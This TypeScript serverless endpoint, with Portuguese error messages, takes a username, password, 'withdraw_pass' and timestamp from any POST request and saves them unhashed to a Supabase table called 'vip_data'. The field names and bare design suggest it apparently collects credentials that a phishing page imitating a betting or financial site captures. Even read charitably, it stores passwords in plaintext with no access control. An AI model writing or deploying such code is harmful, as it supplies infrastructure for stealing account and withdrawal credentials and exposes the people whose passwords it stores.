import { createClient } from '@supabase/supabase-js';
import { IncomingMessage, ServerResponse } from 'http';

const supabaseUrl = process.env.SUPABASE_URL!;
const supabaseKey = process.env.SUPABASE_KEY!;
const supabase = createClient(supabaseUrl, supabaseKey);

export default async (req: IncomingMessage, res: ServerResponse) => {
  res.setHeader('Content-Type', 'application/json');
  
  if (req.method === 'POST') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', async () => {
      try {
        const { user, pass, withdraw_pass, timestamp } = JSON.parse(body);

        const { error } = await supabase
          .from('vip_data')
          .insert([{ user, pass, withdraw_pass, timestamp }]);

        if (error) throw error;

        res.statusCode = 200;
        res.end(JSON.stringify({ success: true }));
      } catch (error: any) {
        console.error('Erro ao salvar:', error.message);
        res.statusCode = 500;
        res.end(JSON.stringify({ error: 'Falha ao salvar dados' }));
      }
    });
  } else {
    res.statusCode = 405;
    res.end(JSON.stringify({ error: 'Método não permitido' }));
  }
};
